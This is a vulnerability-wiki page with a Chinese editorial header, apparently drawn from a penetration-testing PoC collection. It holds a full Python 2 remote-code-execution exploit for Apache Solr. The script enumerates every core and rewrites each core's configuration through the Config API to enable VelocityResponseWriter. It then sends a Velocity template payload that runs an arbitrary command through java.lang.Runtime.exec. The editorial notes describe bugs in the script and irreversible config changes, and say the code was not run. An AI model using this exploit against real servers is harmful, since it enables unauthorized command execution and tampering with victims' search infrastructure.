---
source: "Mr-xn/Penetration_Testing_POC"
title: "solr_rce"
product: "Apache Solr VelocityResponseWriter"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "Python2、Config API可写、core/Velocity可用；命令和输出受运行时影响"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-fbb8bb745650e3801794afcc"
entity_id: "ve-fbb8bb745650e3801794afcc"
schema_version: "1"
---

# solr_rce

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Python2、Config API可写、core/Velocity可用；命令和输出受运行时影响
- 证据范围：代码完整读过，核心同197/200但输出条件反向。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- send_exp仅在400或500打印输出，正常200却称发送失败，成功判断错误
- if中and/or优先级导致400无须有内容也进入；无实际执行标志
- Python2 print未声明，Python3下语法错误
- 命令未URL编码，缺超时/鉴权/参数数量检查，proxies定义未用
- 会遍历修改全部core配置无恢复；标题solr_rce太泛缺版本/CVE

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## solr_rce.py  

```python
import requests,sys,json


def get_code_name(url):
    # http://10.10.20.166:8983
    core_url = url + '/solr/admin/cores?_=1572502179076&indexInfo=false&wt=json'
    r = requests.get(core_url)
    if r.status_code == 200 and 'responseHeader' in r.content and 'status' in r.content:
        json_str = json.loads(r.content)
        for i in json_str['status']:
            core_name_url = url + '/solr/' + i + '/config'
            print core_name_url
            update_queryresponsewriter(core_name_url)
    else:
        print "No core name exit!"


def update_queryresponsewriter(core_name_url):
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'Content-Length': '259',
    'Connection': 'close'
    }
    payload = '''
    {
      "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
    }'''
    proxies = {"http":"http://127.0.0.1:8080"}
    r = requests.post(core_name_url,headers=headers,data=payload)

    if r.status_code == 200 and 'responseHeader' in r.content:
        print "maybe enable Successful!\n"
        exp_url = core_name_url[:-7]
        print exp_url
        cmd = sys.argv[2]
        send_exp(exp_url,cmd)
    else:
        print "enable Fail!\n"

def send_exp(exp_url,cmd):
    exp_url = exp_url + r"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27" + cmd + r"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    
    r = requests.get(exp_url)
    if r.status_code == 400 or r.status_code == 500 and len(r.content) >0:
        print exp_url,'\n'
        print '>>>>>>>\n',r.content
    else:
        print "exp No Send Successful!\n"


if __name__ == '__main__':

    # url = "http://192.168.5.86:8983"
    url = sys.argv[1]
    print("\n[+] python %s http://x.x.x.x:8983  command\n" % sys.argv[0])
    get_code_name(url)
```


---

> 来源：Mr-xn/Penetration_Testing_POC
